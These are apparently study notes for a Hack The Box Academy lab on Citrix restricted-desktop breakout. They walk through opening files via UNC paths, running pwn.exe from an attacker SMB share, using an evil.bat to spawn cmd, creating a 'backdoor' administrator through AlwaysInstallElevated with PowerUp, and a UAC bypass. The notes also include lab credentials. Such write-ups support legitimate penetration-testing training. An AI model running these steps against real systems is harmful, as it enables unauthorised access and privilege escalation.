# Section 24 — Citrix Breakout

> **Lab: yes** — RDP to jump host, connect to Citrix environment, break out of restricted desktop, escalate to Administrator via AlwaysInstallElevated + UAC bypass.

**Core principle:** Restricted desktop environments (Citrix, Terminal Services, Kiosks) lock down File Explorer and cmd/PowerShell access via Group Policy. Breakout uses Windows dialog boxes (File > Open in Paint, Notepad, etc.) to bypass path restrictions, then escalates from there. The methodology: gain dialog box → get command execution → escalate privileges.

---

## Breakout methodology

```
1. Find an application with File > Open / Save As dialog box
   (Paint, Notepad, WordPad, any Office app)
2. Use dialog box to navigate filesystem via UNC path
   \\127.0.0.1\c$\users\<user> bypasses Group Policy folder restrictions
3. Get command execution
   - Run a .bat file containing "cmd"
   - Execute a custom binary (pwn.exe) from SMB share
   - Modify a shortcut's Target to C:\Windows\System32\cmd.exe
4. Enumerate for privilege escalation
   - PowerUp.ps1, WinPEAS
5. Escalate (AlwaysInstallElevated, service misconfigs, etc.)
6. Bypass UAC if needed
```

---

## Step-by-step: Dialog box breakout

### Open a dialog box

Open **MS Paint** from Start Menu → File → Open.

### Navigate via UNC path

In the File name field, type:
```
\\127.0.0.1\c$\users\pmorgan
```
> Set File-Type to **All Files**. Press Enter. This bypasses Group Policy folder restrictions because UNC paths aren't blocked the same way as direct C:\ browsing.

### Access SMB shares (file transfer)

On attacker/jump host, start SMB server:
```bash
smbserver.py -smb2support share $(pwd)
```

In the dialog box, navigate to:
```
\\<ATTACKER_IP>\share
```
> Right-click executables and select Open to run them. Can't copy via restricted File Explorer, but can execute directly or use Explorer++ to copy.

---

## Getting command execution

### Method 1: Custom binary from SMB share

Compile or use a binary that spawns cmd:
```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```
> Right-click `pwn.exe` on the SMB share → Open → cmd spawns.

### Method 2: Batch file

Create `evil.bat` on the Desktop with content:
```
cmd
```
> Double-click to execute → cmd spawns.

### Method 3: Modify existing shortcut

Right-click shortcut → Properties → change Target to:
```
C:\Windows\System32\cmd.exe
```
> Double-click the shortcut → cmd spawns.

---

## Alternative tools for restricted environments

| Tool | Purpose |
|------|---------|
| **Explorer++** | Portable file manager — bypasses GP folder restrictions |
| **Q-Dir** | Alternative file explorer |
| **SmallRegistryEditor** | Registry editing when regedit is blocked |
| **Simpleregedit / Uberregedit** | Alternative registry editors |

---

## Privilege escalation: AlwaysInstallElevated

### Check if enabled

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
> Both must return `0x1` for the attack to work. When enabled, ANY user can install .msi packages with SYSTEM privileges.

### Exploit with PowerUp

```powershell
Import-Module .\PowerUp.ps1
Write-UserAddMSI
```
> Creates `UserAdd.msi` on the Desktop. Run it to create a new user in the Administrators group.

### Run UserAdd.msi

Double-click → fill in:
- Username: `backdoor`
- Password: `T3st@123` (must meet complexity)
- Group: `Administrators`

### Switch to new admin user

```cmd
runas /user:backdoor cmd
```
> Enter password when prompted. New cmd runs as backdoor user.

---

## UAC bypass

Even as a local admin, UAC blocks access to protected directories. Use Bypass-UAC.ps1:

```powershell
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```
> Opens a new elevated PowerShell window. Confirm with `whoami /priv` — should show full admin privileges.

---

## Lab walkthrough

**Target:** `<TARGET_IP>` (ACADEMY-CITRIX-ATTCK)
**RDP Creds:** `htb-student` / `HTB_@cademy_stdnt!`
**Citrix Creds:** `pmorgan` / `Summer1Summer!` / Domain: `htb.local`

### Attack chain (editable)

```
┌─────────────────────────────────────────────────────────┐
│ VARIABLES — edit these for your instance                │
├─────────────────────────────────────────────────────────┤
│ TARGET_IP     = <TARGET_IP>                             │
│ RDP_USER      = htb-student                             │
│ RDP_PASS      = HTB_@cademy_stdnt!                      │
│ CITRIX_USER   = pmorgan                                 │
│ CITRIX_PASS   = Summer1Summer!                          │
│ CITRIX_DOMAIN = htb.local                               │
│ UBUNTU_IP     = (internal IP of RDP host)               │
└─────────────────────────────────────────────────────────┘

STEP 1: ACCESS CITRIX
─────────────────────
1. RDP to jump host
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<TARGET_IP> /u:htb-student /p:'HTB_@cademy_stdnt!'

2. Open browser → http://humongousretail.com/remote/
   Login: pmorgan / Summer1Summer! / htb.local
   Click Default Desktop → download and open launch.ica
   (Wait ~5 min for environment to initialize)

STEP 2: BREAKOUT — GET FLAG 1
──────────────────────────────
3. Open MS Paint from Start Menu
   File → Open

4. In File name field, type:
   \\127.0.0.1\c$\users\pmorgan\Downloads
   Set File-Type to All Files → Enter

5. Find and open flag.txt
   (Q1 answer)

STEP 3: GET CMD ACCESS
──────────────────────
6. Create evil.bat on Desktop:
   Open Notepad → type "cmd" → Save as evil.bat on Desktop
   Double-click evil.bat → cmd spawns

   OR: From the Paint dialog, navigate to SMB share
   with tools (pwn.exe, PowerUp.ps1, Bypass-UAC.ps1)

STEP 4: ESCALATE — AlwaysInstallElevated
─────────────────────────────────────────
7. Verify AlwaysInstallElevated is set
   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

8. Use PowerUp to create MSI
   powershell -ep bypass
   Import-Module .\PowerUp.ps1
   Write-UserAddMSI

9. Run UserAdd.msi
   Create user: backdoor / T3st@123 / Administrators group

10. Switch to backdoor user
    runas /user:backdoor cmd

STEP 5: BYPASS UAC — GET FLAG 2
────────────────────────────────
11. Bypass UAC
    powershell -ep bypass
    Import-Module .\Bypass-UAC.ps1
    Bypass-UAC -Method UacMethodSysprep

12. In elevated window:
    type C:\Users\Administrator\Desktop\flag.txt
    (Q2 answer)
```

---

## Key takeaways

- **Dialog boxes bypass Group Policy folder restrictions.** File > Open in Paint/Notepad/WordPad gives filesystem access that File Explorer blocks.
- **UNC paths (`\\127.0.0.1\c$`) bypass local path restrictions.** Group Policy typically blocks `C:\` browsing but not UNC loopback.
- **Multiple paths to cmd:** batch files, custom binaries, shortcut modification, SMB-hosted executables.
- **Explorer++ is essential for restricted environments.** Portable, no install needed, bypasses GP folder restrictions.
- **AlwaysInstallElevated is a critical misconfiguration.** Both HKCU and HKLM keys set to 1 = any user can install MSI as SYSTEM.
- **UAC bypass is often still needed** even after getting into the Administrators group. Use Bypass-UAC.ps1 or UACMe.
- **Wait 5 minutes after spawning** the Citrix target before connecting.
